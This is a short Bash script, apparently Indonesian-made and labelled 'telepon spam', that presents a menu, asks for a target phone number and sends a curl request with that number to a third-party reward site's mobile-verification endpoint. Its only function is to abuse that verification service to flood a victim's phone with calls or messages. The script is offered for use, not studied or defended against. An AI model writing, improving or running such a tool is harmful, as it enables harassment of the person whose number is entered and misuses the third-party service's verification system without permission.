#!bin/bash
clear
echo "****************************"

echo "____________________________"
echo "Make By : Ahmad Guntur Alfandi :V"
echo "____________________________"
echo "****************************"
figlet Telp | lolcat
echo "::::::::::::::::::::::::::::::"
echo '
[1], telepon spam
[2], keluar &kontak admin
'
echo "::::::::::::::::::::::::::::::"
echo
read -p "Phone Numbers : " pil
if [[ $pil == 1 ]]; then
read -p "Masukan No Target contoh:89528100123  : " nomor
link="https://id.jagreward.com/member/verify-mobile/$nomor"
curl -s $link
else
echo "Thanks For Use Tools ITs"
echo "Welcome Back Again :)"
exit
fi
echo
